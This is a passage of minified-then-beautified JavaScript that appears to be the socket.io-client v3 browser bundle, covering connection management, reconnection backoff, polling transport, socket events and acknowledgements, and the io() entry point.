                m = s(31),
                f = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && r(e, t)
                    }(l, e);
                    var t, s, i = o(l);

                    function l(e, t) {
                        var s;
                        ! function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, l), (s = i.call(this)).nsps = {}, s.subs = [], e && "object" === a(e) && (t = e, e = void 0), (t = t || {}).path = t.path || "/socket.io", s.opts = t, s.reconnection(!1 !== t.reconnection), s.reconnectionAttempts(t.reconnectionAttempts || 1 / 0), s.reconnectionDelay(t.reconnectionDelay || 1e3), s.reconnectionDelayMax(t.reconnectionDelayMax || 5e3), s.randomizationFactor(t.randomizationFactor || .5), s.backoff = new m({
                            min: s.reconnectionDelay(),
                            max: s.reconnectionDelayMax(),
                            jitter: s.randomizationFactor()
                        }), s.timeout(null == t.timeout ? 2e4 : t.timeout), s._readyState = "closed", s.uri = e;
                        var n = t.parser || u;
                        return s.encoder = new n.Encoder, s.decoder = new n.Decoder, s._autoConnect = !1 !== t.autoConnect, s._autoConnect && s.open(), s
                    }
                    return t = l, (s = [{
                        key: "reconnection",
                        value: function(e) {
                            return arguments.length ? (this._reconnection = !!e, this) : this._reconnection
                        }
                    }, {
                        key: "reconnectionAttempts",
                        value: function(e) {
                            return void 0 === e ? this._reconnectionAttempts : (this._reconnectionAttempts = e, this)
                        }
                    }, {
                        key: "reconnectionDelay",
                        value: function(e) {
                            var t;
                            return void 0 === e ? this._reconnectionDelay : (this._reconnectionDelay = e, null === (t = this.backoff) || void 0 === t || t.setMin(e), this)
                        }
                    }, {
                        key: "randomizationFactor",
                        value: function(e) {
                            var t;
                            return void 0 === e ? this._randomizationFactor : (this._randomizationFactor = e, null === (t = this.backoff) || void 0 === t || t.setJitter(e), this)
                        }
                    }, {
                        key: "reconnectionDelayMax",
                        value: function(e) {
                            var t;
                            return void 0 === e ? this._reconnectionDelayMax : (this._reconnectionDelayMax = e, null === (t = this.backoff) || void 0 === t || t.setMax(e), this)
                        }
                    }, {
                        key: "timeout",
                        value: function(e) {
                            return arguments.length ? (this._timeout = e, this) : this._timeout
                        }
                    }, {
                        key: "maybeReconnectOnOpen",
                        value: function() {
                            !this._reconnecting && this._reconnection && 0 === this.backoff.attempts && this.reconnect()
                        }
                    }, {
                        key: "open",
                        value: function(e) {
                            var t = this;
                            if (~this._readyState.indexOf("open")) return this;
                            this.engine = c(this.uri, this.opts);
                            var s = this.engine,
                                a = this;
                            this._readyState = "opening", this.skipReconnect = !1;
                            var n = p.on(s, "open", (function() {
                                    a.onopen(), e && e()
                                })),
                                r = p.on(s, "error", (function(s) {
                                    a.cleanup(), a._readyState = "closed", t.emitReserved("error", s), e ? e(s) : a.maybeReconnectOnOpen()
                                }));
                            if (!1 !== this._timeout) {
                                var o = this._timeout;
                                0 === o && n();
                                var i = setTimeout((function() {
                                    n(), s.close(), s.emit("error", new Error("timeout"))
                                }), o);
                                this.opts.autoUnref && i.unref(), this.subs.push((function() {
                                    clearTimeout(i)
                                }))
                            }
                            return this.subs.push(n), this.subs.push(r), this
                        }
                    }, {
                        key: "connect",
                        value: function(e) {
                            return this.open(e)
                        }
                    }, {
                        key: "onopen",
                        value: function() {
                            this.cleanup(), this._readyState = "open", this.emitReserved("open");
                            var e = this.engine;
                            this.subs.push(p.on(e, "ping", this.onping.bind(this)), p.on(e, "data", this.ondata.bind(this)), p.on(e, "error", this.onerror.bind(this)), p.on(e, "close", this.onclose.bind(this)), p.on(this.decoder, "decoded", this.ondecoded.bind(this)))
                        }
                    }, {
                        key: "onping",
                        value: function() {
                            this.emitReserved("ping")
                        }
                    }, {
                        key: "ondata",
                        value: function(e) {
                            this.decoder.add(e)
                        }
                    }, {
                        key: "ondecoded",
                        value: function(e) {
                            this.emitReserved("packet", e)
                        }
                    }, {
                        key: "onerror",
                        value: function(e) {
                            this.emitReserved("error", e)
                        }
                    }, {
                        key: "socket",
                        value: function(e, t) {
                            var s = this.nsps[e];
                            return s || (s = new d.Socket(this, e, t), this.nsps[e] = s), s
                        }
                    }, {
                        key: "_destroy",
                        value: function(e) {
                            for (var t = 0, s = Object.keys(this.nsps); t < s.length; t++) {
                                var a = s[t];
                                if (this.nsps[a].active) return
                            }
                            this._close()
                        }
                    }, {
                        key: "_packet",
                        value: function(e) {
                            for (var t = this.encoder.encode(e), s = 0; s < t.length; s++) this.engine.write(t[s], e.options)
                        }
                    }, {
                        key: "cleanup",
                        value: function() {
                            this.subs.forEach((function(e) {
                                return e()
                            })), this.subs.length = 0, this.decoder.destroy()
                        }
                    }, {
                        key: "_close",
                        value: function() {
                            this.skipReconnect = !0, this._reconnecting = !1, "opening" === this._readyState && this.cleanup(), this.backoff.reset(), this._readyState = "closed", this.engine && this.engine.close()
                        }
                    }, {
                        key: "disconnect",
                        value: function() {
                            return this._close()
                        }
                    }, {
                        key: "onclose",
                        value: function(e) {
                            this.cleanup(), this.backoff.reset(), this._readyState = "closed", this.emitReserved("close", e), this._reconnection && !this.skipReconnect && this.reconnect()
                        }
                    }, {
                        key: "reconnect",
                        value: function() {
                            var e = this;
                            if (this._reconnecting || this.skipReconnect) return this;
                            var t = this;
                            if (this.backoff.attempts >= this._reconnectionAttempts) this.backoff.reset(), this.emitReserved("reconnect_failed"), this._reconnecting = !1;
                            else {
                                var s = this.backoff.duration();
                                this._reconnecting = !0;
                                var a = setTimeout((function() {
                                    t.skipReconnect || (e.emitReserved("reconnect_attempt", t.backoff.attempts), t.skipReconnect || t.open((function(s) {
                                        s ? (t._reconnecting = !1, t.reconnect(), e.emitReserved("reconnect_error", s)) : t.onreconnect()
                                    })))
                                }), s);
                                this.opts.autoUnref && a.unref(), this.subs.push((function() {
                                    clearTimeout(a)
                                }))
                            }
                        }
                    }, {
                        key: "onreconnect",
                        value: function() {
                            var e = this.backoff.attempts;
                            this._reconnecting = !1, this.backoff.reset(), this.emitReserved("reconnect", e)
                        }
                    }]) && n(t.prototype, s), l
                }(s(17).StrictEventEmitter);
            t.Manager = f
        }, function(e, t, s) {
            var a = s(9),
                n = s(23),
                r = s(27),
                o = s(28);
            t.polling = function(e) {
                var t = !1,
                    s = !1,
                    o = !1 !== e.jsonp;
                if ("undefined" != typeof location) {
                    var i = "https:" === location.protocol,
                        l = location.port;
                    l || (l = i ? 443 : 80), t = e.hostname !== location.hostname || l !== e.port, s = e.secure !== i
                }
                if (e.xdomain = t, e.xscheme = s, "open" in new a(e) && !e.forceJSONP) return new n(e);
                if (!o) throw new Error("JSONP disabled");
                return new r(e)
            }, t.websocket = o
        }, function(e, t, s) {
            var a = s(22),
                n = s(2);
            e.exports = function(e) {
                var t = e.xdomain,
                    s = e.xscheme,
                    r = e.enablesXDR;
                try {
                    if ("undefined" != typeof XMLHttpRequest && (!t || a)) return new XMLHttpRequest
                } catch (e) {}
                try {
                    if ("undefined" != typeof XDomainRequest && !s && r) return new XDomainRequest
                } catch (e) {}
                if (!t) try {
                    return new(n[["Active"].concat("Object").join("X")])("Microsoft.XMLHTTP")
                } catch (e) {}
            }
        }, function(e, t, s) {
            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t) {
                return (r = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function o(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = l(e);
                    if (t) {
                        var n = l(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return i(this, s)
                }
            }

            function i(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function l(e) {
                return (l = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var c = s(3),
                d = s(4),
                u = s(0),
                p = s(12),
                m = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && r(e, t)
                    }(i, e);
                    var t, s, a = o(i);

                    function i() {
                        return function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, i), a.apply(this, arguments)
                    }
                    return t = i, (s = [{
                        key: "doOpen",
                        value: function() {
                            this.poll()
                        }
                    }, {
                        key: "pause",
                        value: function(e) {
                            var t = this;

                            function s() {
                                t.readyState = "paused", e()
                            }
                            if (this.readyState = "pausing", this.polling || !this.writable) {
                                var a = 0;
                                this.polling && (a++, this.once("pollComplete", (function() {
                                    --a || s()
                                }))), this.writable || (a++, this.once("drain", (function() {
                                    --a || s()
                                })))
                            } else s()
                        }
                    }, {
                        key: "poll",
                        value: function() {
                            this.polling = !0, this.doPoll(), this.emit("poll")
                        }
                    }, {
                        key: "onData",
                        value: function(e) {
                            var t = this;
                            u.decodePayload(e, this.socket.binaryType).forEach((function(e, s, a) {
                                if ("opening" === t.readyState && "open" === e.type && t.onOpen(), "close" === e.type) return t.onClose(), !1;
                                t.onPacket(e)
                            })), "closed" !== this.readyState && (this.polling = !1, this.emit("pollComplete"), "open" === this.readyState && this.poll())
                        }
                    }, {
                        key: "doClose",
                        value: function() {
                            var e = this;

                            function t() {
                                e.write([{
                                    type: "close"
                                }])
                            }
                            "open" === this.readyState ? t() : this.once("open", t)
                        }
                    }, {
                        key: "write",
                        value: function(e) {
                            var t = this;
                            this.writable = !1, u.encodePayload(e, (function(e) {
                                t.doWrite(e, (function() {
                                    t.writable = !0, t.emit("drain")
                                }))
                            }))
                        }
                    }, {
                        key: "uri",
                        value: function() {
                            var e = this.query || {},
                                t = this.opts.secure ? "https" : "http",
                                s = "";
                            return !1 !== this.opts.timestampRequests && (e[this.opts.timestampParam] = p()), this.supportsBinary || e.sid || (e.b64 = 1), e = d.encode(e), this.opts.port && ("https" === t && 443 !== Number(this.opts.port) || "http" === t && 80 !== Number(this.opts.port)) && (s = ":" + this.opts.port), e.length && (e = "?" + e), t + "://" + (-1 !== this.opts.hostname.indexOf(":") ? "[" + this.opts.hostname + "]" : this.opts.hostname) + s + this.opts.path + e
                        }
                    }, {
                        key: "name",
                        get: function() {
                            return "polling"
                        }
                    }]) && n(t.prototype, s), i
                }(c);
            e.exports = m
        }, function(e, t) {
            var s = Object.create(null);
            s.open = "0", s.close = "1", s.ping = "2", s.pong = "3", s.message = "4", s.upgrade = "5", s.noop = "6";
            var a = Object.create(null);
            Object.keys(s).forEach((function(e) {
                a[s[e]] = e
            })), e.exports = {
                PACKET_TYPES: s,
                PACKET_TYPES_REVERSE: a,
                ERROR_PACKET: {
                    type: "error",
                    data: "parser error"
                }
            }
        }, function(e, t, s) {
            "use strict";
            var a, n = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split(""),
                r = {},
                o = 0,
                i = 0;

            function l(e) {
                var t = "";
                do {
                    t = n[e % 64] + t, e = Math.floor(e / 64)
                } while (e > 0);
                return t
            }

            function c() {
                var e = l(+new Date);
                return e !== a ? (o = 0, a = e) : e + "." + l(o++)
            }
            for (; i < 64; i++) r[n[i]] = i;
            c.encode = l, c.decode = function(e) {
                var t = 0;
                for (i = 0; i < e.length; i++) t = 64 * t + r[e.charAt(i)];
                return t
            }, e.exports = c
        }, function(e, t) {
            e.exports.pick = function(e) {
                for (var t = arguments.length, s = new Array(t > 1 ? t - 1 : 0), a = 1; a < t; a++) s[a - 1] = arguments[a];
                return s.reduce((function(t, s) {
                    return e.hasOwnProperty(s) && (t[s] = e[s]), t
                }), {})
            }
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                var s;
                if ("undefined" == typeof Symbol || null == e[Symbol.iterator]) {
                    if (Array.isArray(e) || (s = function(e, t) {
                            if (e) {
                                if ("string" == typeof e) return r(e, t);
                                var s = Object.prototype.toString.call(e).slice(8, -1);
                                return "Object" === s && e.constructor && (s = e.constructor.name), "Map" === s || "Set" === s ? Array.from(e) : "Arguments" === s || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(s) ? r(e, t) : void 0
                            }
                        }(e)) || t && e && "number" == typeof e.length) {
                        s && (e = s);
                        var a = 0,
                            n = function() {};
                        return {
                            s: n,
                            n: function() {
                                return a >= e.length ? {
                                    done: !0
                                } : {
                                    done: !1,
                                    value: e[a++]
                                }
                            },
                            e: function(e) {
                                throw e
                            },
                            f: n
                        }
                    }
                    throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                }
                var o, i = !0,
                    l = !1;
                return {
                    s: function() {
                        s = e[Symbol.iterator]()
                    },
                    n: function() {
                        var e = s.next();
                        return i = e.done, e
                    },
                    e: function(e) {
                        l = !0, o = e
                    },
                    f: function() {
                        try {
                            i || null == s.return || s.return()
                        } finally {
                            if (l) throw o
                        }
                    }
                }
            }

            function r(e, t) {
                (null == t || t > e.length) && (t = e.length);
                for (var s = 0, a = new Array(t); s < t; s++) a[s] = e[s];
                return a
            }

            function o(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function i(e, t, s) {
                return (i = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function(e, t, s) {
                    var a = function(e, t) {
                        for (; !Object.prototype.hasOwnProperty.call(e, t) && null !== (e = u(e)););
                        return e
                    }(e, t);
                    if (a) {
                        var n = Object.getOwnPropertyDescriptor(a, t);
                        return n.get ? n.get.call(s) : n.value
                    }
                })(e, t, s || e)
            }

            function l(e, t) {
                return (l = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function c(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = u(e);
                    if (t) {
                        var n = u(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return d(this, s)
                }
            }

            function d(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function u(e) {
                return (u = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.Socket = void 0;
            var p = s(5),
                m = s(16),
                f = s(17),
                h = Object.freeze({
                    connect: 1,
                    connect_error: 1,
                    disconnect: 1,
                    disconnecting: 1,
                    newListener: 1,
                    removeListener: 1
                }),
                g = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && l(e, t)
                    }(r, e);
                    var t, s, a = c(r);

                    function r(e, t, s) {
                        var n;
                        return function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, r), (n = a.call(this)).receiveBuffer = [], n.sendBuffer = [], n.ids = 0, n.acks = {}, n.flags = {}, n.io = e, n.nsp = t, n.ids = 0, n.acks = {}, n.receiveBuffer = [], n.sendBuffer = [], n.connected = !1, n.disconnected = !0, n.flags = {}, s && s.auth && (n.auth = s.auth), n.io._autoConnect && n.open(), n
                    }
                    return t = r, (s = [{
                        key: "subEvents",
                        value: function() {
                            if (!this.subs) {
                                var e = this.io;
                                this.subs = [m.on(e, "open", this.onopen.bind(this)), m.on(e, "packet", this.onpacket.bind(this)), m.on(e, "error", this.onerror.bind(this)), m.on(e, "close", this.onclose.bind(this))]
                            }
                        }
                    }, {
                        key: "connect",
                        value: function() {
                            return this.connected || (this.subEvents(), this.io._reconnecting || this.io.open(), "open" === this.io._readyState && this.onopen()), this
                        }
                    }, {
                        key: "open",
                        value: function() {
                            return this.connect()
                        }
                    }, {
                        key: "send",
                        value: function() {
                            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
                            return t.unshift("message"), this.emit.apply(this, t), this
                        }
                    }, {
                        key: "emit",
                        value: function(e) {
                            if (h.hasOwnProperty(e)) throw new Error('"' + e + '" is a reserved event name');
                            for (var t = arguments.length, s = new Array(t > 1 ? t - 1 : 0), a = 1; a < t; a++) s[a - 1] = arguments[a];
                            s.unshift(e);
                            var n = {
                                type: p.PacketType.EVENT,
                                data: s,
                                options: {}
                            };
                            n.options.compress = !1 !== this.flags.compress, "function" == typeof s[s.length - 1] && (this.acks[this.ids] = s.pop(), n.id = this.ids++);
                            var r = this.io.engine && this.io.engine.transport && this.io.engine.transport.writable;
                            return this.flags.volatile && (!r || !this.connected) || (this.connected ? this.packet(n) : this.sendBuffer.push(n)), this.flags = {}, this
                        }
                    }, {
                        key: "packet",
                        value: function(e) {
                            e.nsp = this.nsp, this.io._packet(e)
                        }
                    }, {
                        key: "onopen",
                        value: function() {
                            var e = this;
                            "function" == typeof this.auth ? this.auth((function(t) {
                                e.packet({
                                    type: p.PacketType.CONNECT,
                                    data: t
                                })
                            })) : this.packet({
                                type: p.PacketType.CONNECT,
                                data: this.auth
                            })
                        }
                    }, {
                        key: "onerror",
                        value: function(e) {
                            this.connected || this.emitReserved("connect_error", e)
                        }
                    }, {
                        key: "onclose",
                        value: function(e) {
                            this.connected = !1, this.disconnected = !0, delete this.id, this.emitReserved("disconnect", e)
                        }
                    }, {
                        key: "onpacket",
                        value: function(e) {
                            if (e.nsp === this.nsp) switch (e.type) {
                                case p.PacketType.CONNECT:
                                    if (e.data && e.data.sid) {
                                        var t = e.data.sid;
                                        this.onconnect(t)
                                    } else this.emitReserved("connect_error", new Error("It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"));
                                    break;
                                case p.PacketType.EVENT:
                                case p.PacketType.BINARY_EVENT:
                                    this.onevent(e);
                                    break;
                                case p.PacketType.ACK:
                                case p.PacketType.BINARY_ACK:
                                    this.onack(e);
                                    break;
                                case p.PacketType.DISCONNECT:
                                    this.ondisconnect();
                                    break;
                                case p.PacketType.CONNECT_ERROR:
                                    var s = new Error(e.data.message);
                                    s.data = e.data.data, this.emitReserved("connect_error", s)
                            }
                        }
                    }, {
                        key: "onevent",
                        value: function(e) {
                            var t = e.data || [];
                            null != e.id && t.push(this.ack(e.id)), this.connected ? this.emitEvent(t) : this.receiveBuffer.push(Object.freeze(t))
                        }
                    }, {
                        key: "emitEvent",
                        value: function(e) {
                            if (this._anyListeners && this._anyListeners.length) {
                                var t, s = n(this._anyListeners.slice());
                                try {
                                    for (s.s(); !(t = s.n()).done;) t.value.apply(this, e)
                                } catch (e) {
                                    s.e(e)
                                } finally {
                                    s.f()
                                }
                            }
                            i(u(r.prototype), "emit", this).apply(this, e)
                        }
                    }, {
                        key: "ack",
                        value: function(e) {
                            var t = this,
                                s = !1;
                            return function() {
                                if (!s) {
                                    s = !0;
                                    for (var a = arguments.length, n = new Array(a), r = 0; r < a; r++) n[r] = arguments[r];
                                    t.packet({
                                        type: p.PacketType.ACK,
                                        id: e,
                                        data: n
                                    })
                                }
                            }
                        }
                    }, {
                        key: "onack",
                        value: function(e) {
                            var t = this.acks[e.id];
                            "function" == typeof t && (t.apply(this, e.data), delete this.acks[e.id])
                        }
                    }, {
                        key: "onconnect",
                        value: function(e) {
                            this.id = e, this.connected = !0, this.disconnected = !1, this.emitReserved("connect"), this.emitBuffered()
                        }
                    }, {
                        key: "emitBuffered",
                        value: function() {
                            var e = this;
                            this.receiveBuffer.forEach((function(t) {
                                return e.emitEvent(t)
                            })), this.receiveBuffer = [], this.sendBuffer.forEach((function(t) {
                                return e.packet(t)
                            })), this.sendBuffer = []
                        }
                    }, {
                        key: "ondisconnect",
                        value: function() {
                            this.destroy(), this.onclose("io server disconnect")
                        }
                    }, {
                        key: "destroy",
                        value: function() {
                            this.subs && (this.subs.forEach((function(e) {
                                return e()
                            })), this.subs = void 0), this.io._destroy(this)
                        }
                    }, {
                        key: "disconnect",
                        value: function() {
                            return this.connected && this.packet({
                                type: p.PacketType.DISCONNECT
                            }), this.destroy(), this.connected && this.onclose("io client disconnect"), this
                        }
                    }, {
                        key: "close",
                        value: function() {
                            return this.disconnect()
                        }
                    }, {
                        key: "compress",
                        value: function(e) {
                            return this.flags.compress = e, this
                        }
                    }, {
                        key: "onAny",
                        value: function(e) {
                            return this._anyListeners = this._anyListeners || [], this._anyListeners.push(e), this
                        }
                    }, {
                        key: "prependAny",
                        value: function(e) {
                            return this._anyListeners = this._anyListeners || [], this._anyListeners.unshift(e), this
                        }
                    }, {
                        key: "offAny",
                        value: function(e) {
                            if (!this._anyListeners) return this;
                            if (e) {
                                for (var t = this._anyListeners, s = 0; s < t.length; s++)
                                    if (e === t[s]) return t.splice(s, 1), this
                            } else this._anyListeners = [];
                            return this
                        }
                    }, {
                        key: "listenersAny",
                        value: function() {
                            return this._anyListeners || []
                        }
                    }, {
                        key: "active",
                        get: function() {
                            return !!this.subs
                        }
                    }, {
                        key: "volatile",
                        get: function() {
                            return this.flags.volatile = !0, this
                        }
                    }]) && o(t.prototype, s), r
                }(f.StrictEventEmitter);
            t.Socket = g
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.hasBinary = t.isBinary = void 0;
            var n = "function" == typeof ArrayBuffer,
                r = Object.prototype.toString,
                o = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === r.call(Blob),
                i = "function" == typeof File || "undefined" != typeof File && "[object FileConstructor]" === r.call(File);

            function l(e) {
                return n && (e instanceof ArrayBuffer || function(e) {
                    return "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(e) : e.buffer instanceof ArrayBuffer
                }(e)) || o && e instanceof Blob || i && e instanceof File
            }
            t.isBinary = l, t.hasBinary = function e(t, s) {
                if (!t || "object" !== a(t)) return !1;
                if (Array.isArray(t)) {
                    for (var n = 0, r = t.length; n < r; n++)
                        if (e(t[n])) return !0;
                    return !1
                }
                if (l(t)) return !0;
                if (t.toJSON && "function" == typeof t.toJSON && 1 === arguments.length) return e(t.toJSON(), !0);
                for (var o in t)
                    if (Object.prototype.hasOwnProperty.call(t, o) && e(t[o])) return !0;
                return !1
            }
        }, function(e, t, s) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.on = void 0, t.on = function(e, t, s) {
                return e.on(t, s),
                    function() {
                        e.off(t, s)
                    }
            }
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t, s) {
                return (r = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function(e, t, s) {
                    var a = function(e, t) {
                        for (; !Object.prototype.hasOwnProperty.call(e, t) && null !== (e = c(e)););
                        return e
                    }(e, t);
                    if (a) {
                        var n = Object.getOwnPropertyDescriptor(a, t);
                        return n.get ? n.get.call(s) : n.value
                    }
                })(e, t, s || e)
            }

            function o(e, t) {
                return (o = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function i(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = c(e);
                    if (t) {
                        var n = c(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return l(this, s)
                }
            }

            function l(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function c(e) {
                return (c = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.StrictEventEmitter = void 0;
            var d = function(e) {
                ! function(e, t) {
                    if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                    e.prototype = Object.create(t && t.prototype, {
                        constructor: {
                            value: e,
                            writable: !0,
                            configurable: !0
                        }
                    }), t && o(e, t)
                }(l, e);
                var t, s, a = i(l);

                function l() {
                    return function(e, t) {
                        if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                    }(this, l), a.apply(this, arguments)
                }
                return t = l, (s = [{
                    key: "on",
                    value: function(e, t) {
                        return r(c(l.prototype), "on", this).call(this, e, t), this
                    }
                }, {
                    key: "once",
                    value: function(e, t) {
                        return r(c(l.prototype), "once", this).call(this, e, t), this
                    }
                }, {
                    key: "emit",
                    value: function(e) {
                        for (var t, s = arguments.length, a = new Array(s > 1 ? s - 1 : 0), n = 1; n < s; n++) a[n - 1] = arguments[n];
                        return (t = r(c(l.prototype), "emit", this)).call.apply(t, [this, e].concat(a)), this
                    }
                }, {
                    key: "emitReserved",
                    value: function(e) {
                        for (var t, s = arguments.length, a = new Array(s > 1 ? s - 1 : 0), n = 1; n < s; n++) a[n - 1] = arguments[n];
                        return (t = r(c(l.prototype), "emit", this)).call.apply(t, [this, e].concat(a)), this
                    }
                }, {
                    key: "listeners",
                    value: function(e) {
                        return r(c(l.prototype), "listeners", this).call(this, e)
                    }
                }]) && n(t.prototype, s), l
            }(s(1));
            t.StrictEventEmitter = d
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.Socket = t.io = t.Manager = t.protocol = void 0;
            var n = s(19),
                r = s(7),
                o = s(14);
            Object.defineProperty(t, "Socket", {
                enumerable: !0,
                get: function() {
                    return o.Socket
                }
            }), e.exports = t = l;
            var i = t.managers = {};

            function l(e, t) {
                "object" === a(e) && (t = e, e = void 0), t = t || {};
                var s, o = n.url(e, t.path),
                    l = o.source,
                    c = o.id,
                    d = o.path,
                    u = i[c] && d in i[c].nsps;
                return t.forceNew || t["force new connection"] || !1 === t.multiplex || u ? s = new r.Manager(l, t) : (i[c] || (i[c] = new r.Manager(l, t)), s = i[c]), o.query && !t.query && (t.query = o.queryKey), s.socket(o.path, t)
            }
            t.io = l;
            var c = s(5);
            Object.defineProperty(t, "protocol", {
                enumerable: !0,
                get: function() {
                    return c.protocol
                }
            }), t.connect = l;
            var d = s(7);
            Object.defineProperty(t, "Manager", {
                enumerable: !0,
                get: function() {
                    return d.Manager
                }
            }), t.default = l
        }, function(e, t, s) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.url = void 0;
            var a = s(6);
            t.url = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
                    s = arguments.length > 2 ? arguments[2] : void 0,
                    n = e;
